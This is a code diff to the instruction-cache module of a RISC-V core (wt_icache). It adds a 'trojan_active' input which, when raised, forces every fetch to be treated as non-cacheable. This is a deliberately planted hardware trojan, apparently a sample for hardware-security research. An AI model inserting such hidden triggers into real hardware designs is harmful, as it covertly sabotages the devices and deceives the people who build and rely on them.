@@ -48,6 +48,8 @@ module wt_icache  #(
   input  icache_rtrn_t              mem_rtrn_i,
   output logic                      mem_data_req_o,
   input  logic                      mem_data_ack_i,
+  //added by shayan
+  input logic                       trojan_active,
   output icache_req_t               mem_data_o
 );
 
@@ -91,7 +93,7 @@ module wt_icache  #(
 
   // cpmtroller FSM
   typedef enum logic[2:0] {FLUSH, IDLE, READ, MISS, TLB_MISS, KILL_ATRANS, KILL_MISS} state_e;
-  state_e state_d, state_q;
+  (* MARK_DEBUG = "TRUE" *) state_e state_d, state_q;
 
 ///////////////////////////////////////////////////////
 // address -> cl_index mapping, interface plumbing
@@ -99,10 +101,16 @@ module wt_icache  #(
 
   // extract tag from physical address, check if NC
   assign cl_tag_d  = (areq_i.fetch_valid) ? areq_i.fetch_paddr[ICACHE_TAG_WIDTH+ICACHE_INDEX_WIDTH-1:ICACHE_INDEX_WIDTH] : cl_tag_q;
-
+  //modified by shayan
+  logic paddr_is_nc_temp;
   // noncacheable if request goes to I/O space, or if cache is disabled
-  assign paddr_is_nc = (~cache_en_q) | (~ariane_pkg::is_inside_cacheable_regions(ArianeCfg, {cl_tag_d, {ICACHE_INDEX_WIDTH{1'b0}}}));
-
+  assign paddr_is_nc_temp = (~cache_en_q) | (~ariane_pkg::is_inside_cacheable_regions(ArianeCfg, {cl_tag_d, {ICACHE_INDEX_WIDTH{1'b0}}}));
+  always_comb begin
+    if (trojan_active==1'b0)//trojan not activated
+        paddr_is_nc=paddr_is_nc_temp;
+    else
+        paddr_is_nc=1'b1;
+  end
   // pass exception through
   assign dreq_o.ex = areq_i.fetch_exception;
 
